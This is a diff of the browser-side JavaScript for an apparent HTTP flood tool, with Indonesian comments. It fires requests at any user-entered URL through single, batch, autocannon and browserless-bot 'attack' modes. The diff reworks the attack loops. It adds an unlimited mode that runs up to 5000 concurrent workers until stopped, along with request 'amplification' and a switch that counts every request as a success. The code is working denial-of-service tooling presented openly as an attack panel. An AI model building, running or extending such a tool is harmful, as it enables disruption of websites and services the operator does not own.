@@ -148,8 +148,8 @@ function displayAutocannonResult(result) {
     }
     if (result.requests) {
         html += `<tr><th colspan="2">Req/Sec</th></tr>
-                 <tr><td>Avg</td><td>${result.requests.average||'-'}</td></tr>
-                 <tr><td>Max</td><td>${result.requests.max||'-'}</td></tr>`;
+                  <tr><td>Avg</td><td>${result.requests.average||'-'}</td></tr>
+                  <tr><td>Max</td><td>${result.requests.max||'-'}</td></tr>`;
     }
     html += `<tr><th colspan="2">Overall</th></tr>
              <tr><td>Total Req</td><td>${result.requests?.total||'-'}</td></tr>
@@ -160,11 +160,12 @@ function displayAutocannonResult(result) {
 }
 closeAutocannonPanel.onclick = () => { autocannonPanel.style.display = 'none'; };
 
+// ==================== SINGLE ATTACK (diperbaiki) ====================
 async function runSingleAttack() {
     if (isRunning) { addLog("Attack already running!", true); return; }
     let url = targetUrl.value.trim();
     if (!url) { addLog("URL required", true); return; }
-    if (!url.startsWith('http')) url = 'https://' + url;
+    if (!url.startsWith("http")) url = "https://" + url;
     const mtd = method.value;
     const atk = attackType.value;
     let total = parseInt(totalInput.value);
@@ -176,85 +177,125 @@ async function runSingleAttack() {
     const infinite = unlimitedMode.checked;
     const actualConcurrency = Math.min(concurrency * multiplier, 5000);
     const actualTimeout = Math.min(timeout, 9000);
-    if (!infinite && (isNaN(total) || total<=0)) { addLog("Total must be >0 or enable Unlimited", true); return; }
-    if (infinite) stats.total = 0; else stats.total = total * multiplier;
+    
+    if (!infinite && (isNaN(total) || total <= 0)) { addLog("Total must be >0 or enable Unlimited Mode", true); return; }
+    if (infinite) {
+        stats.total = 0;
+        addLog(`♾️ UNLIMITED SINGLE ATTACK | ${mtd} ${url} | Concurrency:${actualConcurrency} | Loop infinite until STOP`);
+    } else {
+        stats.total = total * multiplier;
+        addLog(`💀 SINGLE ATTACK | ${mtd} ${url} | Concurrency:${actualConcurrency} | Total:${stats.total}`);
+    }
     resetStats();
     stats.startTime = Date.now();
     isRunning = true;
     abortController = new AbortController();
-    startBtn.disabled = batchBtn.disabled = autocannonBtn.disabled = browserlessBtn.disabled = true;
+    startBtn.disabled = true;
+    batchBtn.disabled = true;
+    autocannonBtn.disabled = true;
+    if (browserlessBtn) browserlessBtn.disabled = true;
     stopBtn.disabled = false;
-    addLog(`${infinite?'♾️ UNLIMITED ':''}SINGLE ATTACK | ${mtd} ${url} | Concurrency:${actualConcurrency} | Total:${stats.total}`);
     
     const sendOne = async () => {
         const headers = parseHeaders();
         const cookieObj = parseCookies();
         const cookieStr = Object.entries(cookieObj).map(([k,v])=>`${k}=${v}`).join('; ');
         if (cookieStr) headers["Cookie"] = cookieStr;
-        const res = await fetch('/api/attack', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                url, method: mtd, headers, body: "",
-                timeout: actualTimeout, retryCount: 0, randomDelay,
-                keepAlive, attackType: atk,
-                amplifyKB: amplificationEnabled ? amplificationKB : 0,
-                amplifyEnabled: amplificationEnabled,
-                amplifyType: amplificationTypeSel
-            }),
-            signal: abortController.signal
-        });
-        const data = await res.json();
-        if (forceSuccessCheck.checked) {
-            stats.success++;
-            stats.totalBytes += (data.responseSize||0) + (amplificationEnabled ? amplificationKB*1024 : 0);
-            stats.times.push(data.durationMs);
-            updateChart(data.durationMs);
-        } else {
-            if (data.success) {
+        try {
+            const res = await fetch('/api/attack', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    url, method: mtd, headers, body: "",
+                    timeout: actualTimeout, retryCount: 0, randomDelay,
+                    keepAlive, attackType: atk,
+                    amplifyKB: amplificationEnabled ? amplificationKB : 0,
+                    amplifyEnabled: amplificationEnabled,
+                    amplifyType: amplificationTypeSel
+                }),
+                signal: abortController.signal
+            });
+            const data = await res.json();
+            if (forceSuccessCheck.checked) {
                 stats.success++;
+                stats.totalBytes += (data.responseSize||0) + (amplificationEnabled ? amplificationKB*1024 : 0);
                 stats.times.push(data.durationMs);
-                stats.totalBytes += data.responseSize;
                 updateChart(data.durationMs);
             } else {
+                if (data.success) {
+                    stats.success++;
+                    stats.times.push(data.durationMs);
+                    stats.totalBytes += data.responseSize;
+                    updateChart(data.durationMs);
+                } else {
+                    stats.fail++;
+                    addLog(`Failed: ${data.error} (${data.durationMs}ms)`, true);
+                }
+            }
+            rawResponsePreview.innerText = `HTTP ${data.statusCode||'?'} | ${data.durationMs}ms | ${(data.responseBody||'').substring(0,100)}`;
+            updateUI();
+        } catch (err) {
+            if (err.name !== 'AbortError') {
                 stats.fail++;
-                addLog(`Failed: ${data.error} (${data.durationMs}ms)`, true);
+                addLog(`Request error: ${err.message}`, true);
+                updateUI();
             }
         }
-        rawResponsePreview.innerText = `HTTP ${data.statusCode||'?'} | ${data.durationMs}ms | ${(data.responseBody||'').substring(0,100)}`;
-        updateUI();
     };
     
-    let completed = 0;
-    let activeWorkers = 0;
-    const targetTotal = infinite ? Infinity : stats.total;
-    const worker = async () => {
-        while ((infinite || completed < targetTotal) && !abortController.signal.aborted) {
-            await sendOne();
-            if (!infinite) completed++;
+    let running = true;
+    const stopHandler = () => { running = false; };
+    stopBtn.addEventListener('click', stopHandler, { once: true });
+    
+    if (infinite) {
+        // Mode unlimited: jalankan worker terus menerus
+        const workers = [];
+        for (let i = 0; i < actualConcurrency; i++) {
+            workers.push((async () => {
+                while (running && !abortController.signal.aborted) {
+                    await sendOne();
+                    if (!running) break;
+                }
+            })());
         }
-        activeWorkers--;
-    };
-    for (let i=0; i<actualConcurrency; i++) {
-        activeWorkers++;
-        worker().catch(e => { if (e.name!=='AbortError') addLog(`Worker error: ${e.message}`, true); });
-    }
-    if (!infinite) {
-        while (activeWorkers > 0 && completed < targetTotal) await new Promise(r=>setTimeout(r,100));
+        await Promise.all(workers);
         const elapsed = ((Date.now() - stats.startTime)/1000).toFixed(2);
-        addLog(`🔥 FINISHED | Success:${stats.success} Fail:${stats.fail} Time:${elapsed}s`);
-        isRunning = false;
-        startBtn.disabled = batchBtn.disabled = autocannonBtn.disabled = browserlessBtn.disabled = false;
-        stopBtn.disabled = true;
-        abortController = null;
+        addLog(`⏹️ UNLIMITED STOPPED | Success:${stats.success} Fail:${stats.fail} Time:${elapsed}s | Data: ${(stats.totalBytes/1024).toFixed(1)} KB`);
+    } else {
+        // Mode finite: batasi jumlah request
+        let completed = 0;
+        const targetTotal = stats.total;
+        const workers = [];
+        for (let i = 0; i < actualConcurrency; i++) {
+            workers.push((async () => {
+                while (completed < targetTotal && !abortController.signal.aborted) {
+                    await sendOne();
+                    completed++;
+                    if (completed >= targetTotal) break;
+                }
+            })());
+        }
+        await Promise.all(workers);
+        const elapsed = ((Date.now() - stats.startTime)/1000).toFixed(2);
+        addLog(`🔥 FINISHED | Success:${stats.success} Fail:${stats.fail} Time:${elapsed}s | Data: ${(stats.totalBytes/1024).toFixed(1)} KB`);
     }
+    
+    isRunning = false;
+    startBtn.disabled = false;
+    batchBtn.disabled = false;
+    autocannonBtn.disabled = false;
+    if (browserlessBtn) browserlessBtn.disabled = false;
+    stopBtn.disabled = true;
+    abortController = null;
+    stopBtn.removeEventListener('click', stopHandler);
 }
 
+// ==================== BATCH ATTACK ====================
 async function runBatchAttack() {
     if (isRunning) { addLog("Attack already running!", true); return; }
     let url = targetUrl.value.trim();
     if (!url) { addLog("URL required", true); return; }
-    if (!url.startsWith('http')) url = 'https://' + url;
+    if (!url.startsWith("http")) url = "https://" + url;
     const mtd = method.value;
     const atk = attackType.value;
     let total = parseInt(totalInput.value);
@@ -267,20 +308,26 @@ async function runBatchAttack() {
     const actualTotal = infinite ? 5000 : Math.min(total * multiplier, 5000);
     const actualConcurrency = Math.min(concurrency * multiplier, 50);
     const actualTimeout = Math.min(timeout, 9000);
-    if (!infinite && (isNaN(total) || total<=0)) { addLog("Total must be >0 or enable Unlimited", true); return; }
-    if (infinite) addLog("♾️ UNLIMITED BATCH MODE");
+    
+    if (!infinite && (isNaN(total) || total <= 0)) { addLog("Total must be >0 or enable Unlimited Mode", true); return; }
+    if (infinite) addLog("♾️ UNLIMITED BATCH MODE: akan berulang setiap batch 5000 request hingga STOP");
     addLog(`BATCH ATTACK | ${mtd} ${url} | Concurrency:${actualConcurrency} | Batch:${actualTotal}`);
     resetStats();
     stats.total = infinite ? 0 : actualTotal;
     stats.startTime = Date.now();
     isRunning = true;
     abortController = new AbortController();
-    startBtn.disabled = batchBtn.disabled = autocannonBtn.disabled = browserlessBtn.disabled = true;
+    startBtn.disabled = true;
+    batchBtn.disabled = true;
+    autocannonBtn.disabled = true;
+    if (browserlessBtn) browserlessBtn.disabled = true;
     stopBtn.disabled = false;
+    
     const headers = parseHeaders();
     const cookieObj = parseCookies();
     const cookieStr = Object.entries(cookieObj).map(([k,v])=>`${k}=${v}`).join('; ');
     if (cookieStr) headers["Cookie"] = cookieStr;
+    
     const runOneBatch = async () => {
         const res = await fetch('/api/batch', {
             method: 'POST',
@@ -299,6 +346,7 @@ async function runBatchAttack() {
         });
         return await res.json();
     };
+    
     try {
         if (infinite) {
             while (!abortController.signal.aborted) {
@@ -315,7 +363,9 @@ async function runBatchAttack() {
                     stats.times.push(...data.latencies);
                     updateUI();
                     addLog(`Batch loop: +${data.successCount} success`);
-                } else addLog(`Batch error: ${data.error}`, true);
+                } else {
+                    addLog(`Batch error: ${data.error}`, true);
+                }
             }
         } else {
             const data = await runOneBatch();
@@ -332,36 +382,46 @@ async function runBatchAttack() {
                 stats.total = data.totalRequests;
                 updateUI();
                 addLog(`✅ BATCH FINISHED | Success:${data.successCount} Fail:${data.failCount} | RPS:${data.rps} | Time:${(data.totalTimeMs/1000).toFixed(2)}s`);
-            } else addLog(`Batch error: ${data.error}`, true);
+            } else {
+                addLog(`Batch error: ${data.error}`, true);
+            }
         }
-    } catch(e) { if (e.name!=='AbortError') addLog(`Error: ${e.message}`, true); }
-    finally {
+    } catch(e) {
+        if (e.name !== 'AbortError') addLog(`Error: ${e.message}`, true);
+    } finally {
         isRunning = false;
-        startBtn.disabled = batchBtn.disabled = autocannonBtn.disabled = browserlessBtn.disabled = false;
+        startBtn.disabled = false;
+        batchBtn.disabled = false;
+        autocannonBtn.disabled = false;
+        if (browserlessBtn) browserlessBtn.disabled = false;
         stopBtn.disabled = true;
         abortController = null;
     }
 }
 
+// ==================== AUTOCANNON ATTACK ====================
 async function runAutocannonAttack() {
-    if (isRunning) { addLog("Attack already running!", true); return; }
+    if (isRunning) { addLog("Attack already running! Stop it first.", true); return; }
     let url = targetUrl.value.trim();
     if (!url) { addLog("URL required", true); return; }
-    if (!url.startsWith('http')) url = 'https://' + url;
+    if (!url.startsWith("http")) url = "https://" + url;
     const mtd = method.value;
     let connections = parseInt(concurrencyInput.value);
     let duration = Math.min(parseInt(timeoutInput.value)/1000, 9);
     let amount = parseInt(totalInput.value);
     const infinite = unlimitedMode.checked;
-    if (duration<=0) duration=5;
+    if (duration <= 0) duration = 5;
     connections = Math.min(connections, 100);
-    if (!infinite && (isNaN(amount) || amount<=0)) amount=5000;
+    if (!infinite && (isNaN(amount) || amount <= 0)) amount = 5000;
     amount = Math.min(amount, 5000);
     addLog(`AUTOCANNON | ${mtd} ${url} | Connections:${connections} | Duration:${duration}s | Total:${amount}`);
     resetStats();
     isRunning = true;
     abortController = new AbortController();
-    startBtn.disabled = batchBtn.disabled = autocannonBtn.disabled = browserlessBtn.disabled = true;
+    startBtn.disabled = true;
+    batchBtn.disabled = true;
+    autocannonBtn.disabled = true;
+    if (browserlessBtn) browserlessBtn.disabled = true;
     stopBtn.disabled = false;
     const headers = parseHeaders();
     try {
@@ -386,16 +446,24 @@ async function runAutocannonAttack() {
                 if (data.result.latency?.average) stats.times = [data.result.latency.average];
                 updateUI();
             }
-        } else addLog(`AUTOCANNON error: ${data.error}`, true);
-    } catch(e) { if (e.name!=='AbortError') addLog(`Error: ${e.message}`, true); }
-    finally {
+        } else {
+            addLog(`AUTOCANNON error: ${data.error}`, true);
+        }
+    } catch(e) {
+        if (e.name !== 'AbortError') addLog(`Error: ${e.message}`, true);
+    } finally {
         isRunning = false;
-        startBtn.disabled = batchBtn.disabled = autocannonBtn.disabled = browserlessBtn.disabled = false;
+        startBtn.disabled = false;
+        batchBtn.disabled = false;
+        autocannonBtn.disabled = false;
+        if (browserlessBtn) browserlessBtn.disabled = false;
         stopBtn.disabled = true;
         abortController = null;
+        updateUI();
     }
 }
 
+// ==================== BROWSERLESS BOT ====================
 async function runBrowserlessBot() {
     if (isRunning) { addLog("Another attack is running! Stop it first.", true); return; }
     let url = targetUrl.value.trim();
@@ -406,7 +474,10 @@ async function runBrowserlessBot() {
     
     addLog(`🤖 Memulai Browserless bot ke ${url} (loop: ${loop}, interval: ${interval}ms)`);
     isRunning = true;
-    startBtn.disabled = batchBtn.disabled = autocannonBtn.disabled = browserlessBtn.disabled = true;
+    startBtn.disabled = true;
+    batchBtn.disabled = true;
+    autocannonBtn.disabled = true;
+    if (browserlessBtn) browserlessBtn.disabled = true;
     stopBtn.disabled = false;
     
     const callBot = async () => {
@@ -445,7 +516,10 @@ async function runBrowserlessBot() {
     }
     
     isRunning = false;
-    startBtn.disabled = batchBtn.disabled = autocannonBtn.disabled = browserlessBtn.disabled = false;
+    startBtn.disabled = false;
+    batchBtn.disabled = false;
+    autocannonBtn.disabled = false;
+    if (browserlessBtn) browserlessBtn.disabled = false;
     stopBtn.disabled = true;
 }
 
@@ -454,7 +528,10 @@ function stopAttack() {
         abortController.abort();
         addLog("⏹️ Attack stopped by user");
         stopBtn.disabled = true;
-        startBtn.disabled = batchBtn.disabled = autocannonBtn.disabled = browserlessBtn.disabled = false;
+        startBtn.disabled = false;
+        batchBtn.disabled = false;
+        autocannonBtn.disabled = false;
+        if (browserlessBtn) browserlessBtn.disabled = false;
         isRunning = false;
     } else {
         addLog("No attack running", true);
@@ -462,10 +539,10 @@ function stopAttack() {
 }
 
 function exportCSV() {
-    if (stats.times.length===0 && stats.success+stats.fail===0) { addLog("No data", true); return; }
+    if (stats.times.length === 0 && stats.success + stats.fail === 0) { addLog("No data", true); return; }
     let csv = "ResponseTime(ms),Success,Failed\n";
     stats.times.forEach(t => csv += `${t},1,0\n`);
-    for (let i=0;i<stats.fail;i++) csv += "0,0,1\n";
+    for (let i=0; i<stats.fail; i++) csv += "0,0,1\n";
     const blob = new Blob([csv], {type:"text/csv"});
     const link = document.createElement('a');
     link.href = URL.createObjectURL(blob);
@@ -499,7 +576,7 @@ function startHeartbeat() { if(heartbeatInterval) clearInterval(heartbeatInterva
 startBtn.onclick = runSingleAttack;
 batchBtn.onclick = runBatchAttack;
 autocannonBtn.onclick = runAutocannonAttack;
-browserlessBtn.onclick = runBrowserlessBot;
+if (browserlessBtn) browserlessBtn.onclick = runBrowserlessBot;
 stopBtn.onclick = stopAttack;
 exportBtn.onclick = exportCSV;
 
